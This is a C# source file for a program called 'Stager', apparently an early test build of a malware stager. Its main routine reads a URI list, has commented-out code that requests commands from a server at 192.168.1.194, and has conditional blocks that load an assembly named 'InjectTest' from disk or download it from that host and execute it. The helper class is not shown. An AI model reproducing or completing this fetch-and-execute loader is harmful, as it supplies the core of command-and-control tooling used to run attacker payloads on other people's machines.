#define DEBUG
//#define LOCAL_LOAD
//#define REMOTE_LOAD

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Stager
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = @"C:\Users\kylee\Documents\uris.txt";
            FileInfo info = new FileInfo(path);
            StageZero stage;
            if (info.Exists)
                stage = new StageZero(info, 5, 5);
            else
                Console.WriteLine("URI file does not exist!");
            //StagerCommand cmd = await stage.RequestCommand(new Uri("http://192.168.1.194"));
            //Console.WriteLine("Command: " + cmd.Command);
            //if (cmd.Command == Command.Load)
            //    stage.RequestStage(cmd.Uri);

#if LOCAL_LOAD
            Console.WriteLine("Attempting to load DLL");
            string assemblyPath = "C:\\Users\\kylee\\source\\repos\\InjectTest\\InjectTest\\bin\\Debug\\netstandard2.0\\InjectTest.dll";
            FileInfo assemblyFileInfo = new FileInfo(assemblyPath);
            FileStream fs = assemblyFileInfo.OpenRead();
            byte[] assemblyBytes = new byte[assemblyFileInfo.Length];
            try
            {
                fs.Read(assemblyBytes, 0, (int)assemblyFileInfo.Length);
            }
            catch(IOException e)
            {
                Console.WriteLine("Error opening file: " + e.Message);
            }
            stage.LoadStage(assemblyBytes);
#endif
#if REMOTE_LOAD
            Console.WriteLine("\n[*] Starting remote download then execution of assembly");
            stage.RequestStage(new Uri("http://192.168.1.194/InjectTest.dll"));
            
#endif
            //Console.Read(); // Pause output
        }
    }
}
